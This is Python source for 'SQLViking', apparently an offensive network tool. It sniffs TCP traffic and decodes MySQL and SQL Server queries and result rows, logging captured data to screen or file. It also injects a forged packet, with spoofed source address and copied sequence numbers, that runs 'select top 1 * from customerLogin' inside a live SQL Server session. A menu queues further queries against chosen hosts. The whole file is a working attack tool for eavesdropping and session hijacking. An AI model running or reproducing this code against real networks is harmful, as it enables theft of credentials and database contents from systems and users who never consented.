import sys,threading,time,logging,os
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Queue import Queue
from sys import path
path.append("pymysql/")
import connections
path.append("pytds/")
import sqlserver

pkts=Queue()
queries=Queue()

class Parse(threading.Thread):
    #TODO: need to be able to set MTU from cmdline
    def __init__(self,mtu=1500):
        threading.Thread.__init__(self)
        self.die = False
        self.mtu = mtu
        self.frag = {}
        self.res = ''

    def run(self):
        global pkts
        while not self.die:
            if not pkts.empty():
                self.parse(pkts.get())

    def parse(self,pkt):
        #TODO: determining parser by port. need to account for DBs on non-standard ports.
        #print '\nSource:\t%s\nTCP Val:\t%s\nAck:\t%s\nSeq:\t%s\n'%(pkt[IP].src,str(pkt[TCP]).encode('hex'),pkt[TCP].ack,pkt[TCP].seq)

        if pkt[TCP].sport == 1433 or pkt[TCP].sport == 3306:
            #reassesmble pkts if fragged
            key='%s:%s'%(pkt[IP].dst,pkt[TCP].dport)
            if len(str(pkt[IP])) == self.mtu:
                try:
                    self.frag[key]+=str(pkt[TCP])[20:]
                except KeyError:
                    self.frag[key]=str(pkt[TCP])[20:]
            else:
                try:
                    if pkt[TCP].sport == 1433:
                        self.parseRespSQLServ(self.frag[key]+str(pkt[TCP])[20:])
                    else:
                        self.parseRespMySQL(self.frag[key]+str(pkt[TCP])[20:])
                    del self.frag[key]
                except KeyError:
                    if pkt[TCP].sport == 1433:
                        self.parseRespSQLServ(str(pkt[TCP])[20:])
                    else:
                        self.parseRespMySQL(str(pkt[TCP])[20:])
        elif pkt[TCP].dport == 1433:
            if len(pkt[TCP]) == 26:
                req = sqlserver.Request()
                send(IP(dst="192.168.37.135",src=pkt[IP].src)/TCP(flags="PA",dport=pkt[TCP].dport,sport=pkt[TCP].sport,seq=pkt[TCP].seq,ack=pkt[TCP].ack)/req.buildRequest("select top 1 * from customerLogin"))
            self.parseReqSQLServ(str(pkt[TCP]).encode('hex')[40:])
        elif pkt[TCP].dport == 3306:
            self.parseReqMySQL(str(pkt[TCP]).encode('hex')[40:])

    def validAscii(self,h):
        if int(h,16)>31 and int(h,16)<127:
            return True
        return False

    def readable(self,data):
        a=""
        #TODO: terrible code, find better way to iterate over 2 chars at a time
        for i in range(0,len(data)/2):
            if self.validAscii(data[i*2:i*2+2]):
                a+=data[i*2:i*2+2].decode("hex")
        return a

    def formatTuple(self,t):
        res=''
        for i in t:
            res+="%s, "%i
        return res[:-2]

    def parseReqMySQL(self,data):
        self.logres("\n--MySQL Req--")
        self.logres("\nRaw: %s\n"%data)
        self.logres("\nASCII: %s\n"%self.readable(data))

    def parseRespMySQL(self,data):
        self.logres("\n--MySQL Resp--")
        res = connections.MySQLResult(connections.Result(data))
        try:
            res.read()
            self.logres('\n[*] Message:\t%s\n'%str(res.message))
            self.logres('\n[*] Description:\t%s\n'%str(res.description))
            self.logres('\n[*] Rows:\n')
            for r in res.rows:
                self.logres(self.formatTuple(r))
        except:
            self.logres('\n[!] Error:\t%s\n'%sys.exc_info()[1])
    def parseReqSQLServ(self,data):
        self.logres("\n--SQLServ Req--\n%s\n"%self.readable(data))

    def parseRespSQLServ(self,data):
        resp = sqlserver.Response(data)
        resp.parse()
        
        if len(resp.messages) > 0:
            self.logres("--SQLServ Resp--\n%s"%resp.messages[0]['message'])
        else:
            self.logres("--SQLServ Resp--\n%s"%resp.results)

    def println(self):
        print(self.res)
        self.res=''

    def writeln(self,path):
        with file(path,'w') as f:
            f.write(self.res)

    def logres(self,s):
        self.res+=s

class Scout(threading.Thread):
    def __init__(self):
            threading.Thread.__init__(self)
            self.die = False
        
    def run(self):
        self.scout()

    def scout(self):
        while not self.die:
            try:
                sniff(prn=self.pushToQueue,filter="tcp",store=0,timeout=5,verbose=None)
            except:
                self.die = True

    def pushToQueue(self,pkt):
        global pkts
        pkts.put(pkt)
    
class Pillage(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.die = False

    def run(self):
        global queries
        while not self.die:
            if not queries.empty():
                q = queries.get()
                print('[*] Executing query:\t%s'%q[0])
                print('[*] Targetting:\t%s'%q[1])

def writeResults(t):
    print('[*] Enter filepath to write to:')
    path = raw_input("> ")
    t.writeln(path)  

def printResults():
    print('[*] Results so far:')

def pillage():
    global queries
    print('[*] Enter query to execute:')
    query = raw_input("> ")
    print('[*] Enter IP:port to execute against:')
    dst = raw_input("> ")
    print('[*] Run %s against %s? [y/n]'%(query,dst))
    ans = raw_input("> ")
    if ans == 'y':
        queries.put([query,dst])
        print('[*] Query will run as soon as possible')
    else:
        print('[*] Cancelling...')
    time.sleep(3)

def parseInput(input,t):
    if input == 'w':
        writeResults(t)
    elif input == 'p':
    	#TODO: need parsing thread to save all data to a globally accessible data structure. another queue?
        t.println()
    elif input == 'r':
        pillage()
    elif input == 'q':
        raise KeyboardInterrupt
    else:
        print('Unknown command entered')    

def wipeScreen():
    y,x = os.popen('stty size', 'r').read().split()
    print('\033[1;1H')
    for i in range(0,int(y)):
	    print(' '*int(x))
    print('\033[1;1H')

def printMainMenu(wipe=True):
    wipeScreen()
    y,x = os.popen('stty size', 'r').read().split()
    print('{{:^{}}}'.format(x).format('===Welcome to SQLViking==='))
    print('\n[*] Menu Items:')
    print('\tw - dump current results to file specified')
    print('\tp - print current results to screen')
    print('\tr - run a query against a specified DB')
    print('\tq - quit')

def main():
    #TODO: better menu. running counter of reqs/resps capped and DBs discovered.
    
    #send(IP(dst="192.168.37.135",src="192.168.37.1")/TCP(dport=1433,sport=9999,seq=270991360,ack=270991360)/"select top 1 * from customerLogin")

    t1 = Scout()
    t2 = Parse()
    t3 = Pillage()
    t1.start()
    t2.start()
    t3.start()

    while True:
        printMainMenu()
        try:
            parseInput(raw_input("\n> "),t2)
        #except KeyboardInterrupt:
        except:
            print('\n[!] Shutting down...')
            t1.die = True
            t2.die = True
            t3.die = True
            break
    
if __name__ == "__main__":
    main()
